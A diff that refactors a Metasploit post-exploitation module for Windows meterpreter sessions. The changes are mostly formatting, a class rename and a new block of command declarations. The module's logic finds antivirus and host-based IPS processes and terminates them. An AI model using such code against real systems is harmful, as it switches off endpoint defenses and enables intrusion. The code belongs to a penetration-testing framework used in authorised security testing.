@@ -1,30 +1,40 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'set'
 
-class Metasploit4 < Msf::Post
+class MetasploitModule < Msf::Post
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'         => 'Windows Post Kill Antivirus and Hips',
-      'Description'  => %q{
-        This module attempts to locate and terminate any processes that are identified
-        as being Antivirus or Host-based IPS related.
-      },
-      'License'      => MSF_LICENSE,
-      'Author'       => [
-        'Marc-Andre Meloche (MadmanTM)',
-        'Nikhil Mittal (Samratashok)',
-        'Jerome Athias',
-        'OJ Reeves'
-      ],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter']
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Post Kill Antivirus and Hips',
+        'Description' => %q{
+          This module attempts to locate and terminate any processes that are identified
+          as being Antivirus or Host-based IPS related.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Marc-Andre Meloche (MadmanTM)',
+          'Nikhil Mittal (Samratashok)',
+          'Jerome Athias',
+          'OJ Reeves'
+        ],
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              stdapi_sys_process_get_processes
+              stdapi_sys_process_kill
+            ]
+          }
+        }
+      )
+    )
   end
 
   def skip_process_name?(process_name)
@@ -43,6 +53,7 @@ class Metasploit4 < Msf::Post
     processes_killed = 0
     client.sys.process.get_processes().each do |x|
       next if skip_process_name?(x['name'].downcase)
+
       vprint_status("Checking #{x['name'].downcase} ...")
       if avs.include?(x['name'].downcase)
         processes_found += 1
@@ -63,5 +74,4 @@ class Metasploit4 < Msf::Post
       print_good("A total of #{processes_found} process(es) were discovered, #{processes_killed} were terminated.")
     end
   end
-
 end
